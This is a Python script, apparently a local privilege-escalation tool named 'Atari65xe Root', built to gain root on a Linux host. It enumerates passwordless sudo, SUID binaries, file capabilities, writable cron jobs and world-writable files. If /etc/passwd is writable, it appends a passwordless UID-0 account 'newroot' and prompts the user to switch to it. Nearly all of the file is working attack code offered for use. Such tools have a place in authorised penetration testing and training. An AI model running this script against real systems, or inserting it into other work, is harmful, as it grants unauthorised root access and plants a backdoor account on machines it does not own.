import os

def print_ascii_art():
    print(r"""
+=================================+
| ____                    __      |
|/\  _`\   Atari65xe     /\ \__   |
|\ \ \L\ \    ___     ___\ \ ,_\  |
| \ \ ,  /   / __`\  / __`\ \ \/  |
|  \ \ \\ \ /\ \L\ \/\ \L\ \ \ \_ |
|   \ \_\ \_\ \____/\ \____/\ \__\|
|    \/_/\/ /\/___/  \/___/  \/__/|
+=================================+
""")


def check_sudo():
    print("\nChecking for sudo permissions without a password...")
    if os.system("sudo -n true 2>/dev/null") == 0:
        print("You can run sudo without a password!")
        if input("Do you want to execute 'sudo whoami'? [y/n]: ") == 'y':
            os.system("sudo whoami")

def exploit_writable_passwd():
    print("\nExploiting writable /etc/passwd to add a new root user...")
    with open("/etc/passwd", "a") as file:
        file.write("newroot:x:0:0:root:/root:/bin/bash\n")
    print("Added new root user 'newroot'. Please use 'su newroot' to switch to root user.")

def check_writable_passwd():
    print("\nChecking if /etc/passwd is writable...")
    if os.access("/etc/passwd", os.W_OK):
        print("/etc/passwd is writable!")
        if input("Do you want to exploit writable /etc/passwd? [y/n]: ") == 'y':
            exploit_writable_passwd()

def find_suid_binaries():
    print("\nSearching for SUID binaries that might be exploitable...")
    os.system("find / -perm -4000 -exec ls -la {} 2>/dev/null \;")

def check_cron_jobs():
    print("\nChecking for writable cron jobs or scripts...")
    os.system("find /etc/cron* -type f -writable 2>/dev/null")

def check_exploitable_capabilities():
    print("\nChecking for exploitable capabilities...")
    os.system("getcap -r / 2>/dev/null")

def check_env_variables():
    print("\nChecking environment variables for misconfigurations...")
    os.system("echo $PATH")
    os.system("echo $LD_PRELOAD")

def check_services():
    print("\nChecking for misconfigured services...")
    os.system("ps aux | grep root")

def check_world_writable_files():
    print("\nSearching for world-writable files...")
    os.system("find / -perm -2 ! -type l -ls 2>/dev/null")

def check_user_cron_jobs():
    print("\nChecking for user-specific writable cron jobs...")
    os.system("crontab -l")
    os.system("find /var/spool/cron/crontabs -type f -writable 2>/dev/null")

def main():
    print_ascii_art()
    print("Starting comprehensive privilege escalation checks...")
    check_sudo()
    check_writable_passwd()
    find_suid_binaries()
    check_cron_jobs()
    check_exploitable_capabilities()
    check_env_variables()
    check_services()
    check_world_writable_files()
    check_user_cron_jobs()
    print("\nCompleted all checks. Review above outputs for potential exploitation vectors.")

if __name__ == "__main__":
    main()